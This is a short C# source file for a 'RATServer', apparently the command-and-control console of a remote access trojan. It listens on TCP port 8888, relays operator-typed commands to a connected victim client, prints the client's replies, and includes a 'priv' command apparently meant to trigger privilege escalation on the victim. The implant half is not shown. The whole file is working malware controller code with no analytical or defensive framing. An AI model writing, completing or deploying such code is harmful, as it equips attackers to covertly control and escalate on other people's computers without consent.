using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace RATServer
{
    class Program
    {
        static void Main(string[] args)
        {
            StartServer();
        }

        static void StartServer()
        {
            TcpListener listener = new TcpListener(IPAddress.Any, 8888);
            listener.Start();
            Console.WriteLine("[Listener started]");

            while (true)
            {
                Console.WriteLine("[Listening For Client]");
                TcpClient client = listener.AcceptTcpClient();
                Console.WriteLine("[Client connected]");

                try
                {
                    while (client.Connected)
                    {
                        Console.Write("\n[Command]: ");
                        while (Console.KeyAvailable)
                        {
                            Console.ReadKey(true);
                        }
                        string cmdInput = Console.ReadLine();
                        byte[] cmdBytes = Encoding.ASCII.GetBytes(cmdInput);
                        client.GetStream().Write(cmdBytes, 0, cmdBytes.Length);

                        byte[] buffer = new byte[1024];
                        int bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
                        string response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        Console.WriteLine("\n[Client]: " + response);

                        if (cmdInput.Trim().ToLower() == "priv")
                        {
                            byte[] privBytes = Encoding.ASCII.GetBytes(cmdInput);
                            client.GetStream().Write(privBytes, 0, privBytes.Length);

                            buffer = new byte[1024];
                            bytesRead = client.GetStream().Read(buffer, 0, buffer.Length);
                            response = Encoding.ASCII.GetString(buffer, 0, bytesRead);
                        }
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine("\n[Error]: " + e.Message);
                }
                finally
                {
                    client.Close();
                    Console.WriteLine("\n[Client disconnected]");
                }
            }
        }
    }
}
